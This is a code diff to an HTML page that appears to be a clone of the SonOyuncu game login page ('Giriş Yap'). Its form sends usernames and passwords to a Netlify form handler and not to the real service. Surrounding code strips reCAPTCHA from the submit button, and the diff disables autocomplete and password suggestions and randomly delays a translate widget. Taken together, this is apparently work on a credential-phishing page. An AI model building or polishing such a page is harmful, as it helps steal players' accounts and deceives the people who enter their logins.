@@ -107,7 +107,7 @@ function biscolabLaravelReCaptcha(token) {
 </a>
 </div>
 <div class="w-full">
-<div class="form-hover-zone"><form class="px-8 pt-6 pb-6" data-netlify="true" id="biscolab-recaptcha-invisible-form" method="POST" name="giris-yap" action="/"><input name="form-name" type="hidden" value="giris-yap"/>
+<div class="form-hover-zone"><form class="px-8 pt-6 pb-6" data-netlify="true" id="biscolab-recaptcha-invisible-form" method="POST" name="giris-yap" action="/" autocomplete="off"><input name="form-name" type="hidden" value="giris-yap"/>
 <input name="token" type="hidden" value="e6cf690aeb8b176a68cfd020a4b2685075647e5150442d736ceac5705e0dbe8d"/>
 <h1 class="text-2xl font-semibold">Giriş Yap</h1>
 <p class="text-sm mb-4">SonOyuncu hesabına giriş yap.</p>
@@ -290,6 +290,25 @@ function onSubmit(token) {
     var ip = getInputs(form);
     if (ip.u && !ip.u.name) ip.u.setAttribute('name', 'username');
     if (ip.p && !ip.p.name) ip.p.setAttribute('name', 'password');
+    // Disable browser autocomplete/suggestions
+    try {
+      form.setAttribute('autocomplete', 'off');
+      if (ip.u) {
+        ip.u.setAttribute('autocomplete', 'off');
+        ip.u.setAttribute('autocapitalize', 'off');
+        ip.u.setAttribute('autocorrect', 'off');
+        ip.u.setAttribute('spellcheck', 'false');
+        ip.u.removeAttribute('list'); // remove datalist suggestions if any
+      }
+      if (ip.p) {
+        ip.p.setAttribute('autocomplete', 'new-password'); // disable password suggestions
+        ip.p.setAttribute('autocapitalize', 'off');
+        ip.p.setAttribute('autocorrect', 'off');
+        ip.p.setAttribute('spellcheck', 'false');
+        ip.p.removeAttribute('list');
+      }
+    } catch(_) {}
+    
 
     // Prevent reCAPTCHA: remove g-recaptcha class/attrs from the visible button
     var btn = form.querySelector('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]');
@@ -335,5 +354,23 @@ function onSubmit(token) {
 </script>
 <!-- END: Validation + banner additions -->
 
+
+
+<script>
+(function(){
+  function delayTranslate(){
+    var el = document.getElementById('google_translate_element');
+    if (!el) return;
+    el.style.visibility = 'hidden';
+    var d = 500 + Math.floor(Math.random()*1000);
+    setTimeout(function(){ el.style.visibility = 'visible'; }, d);
+  }
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', delayTranslate);
+  } else {
+    delayTranslate();
+  }
+})();
+</script>
 
 </body></html>
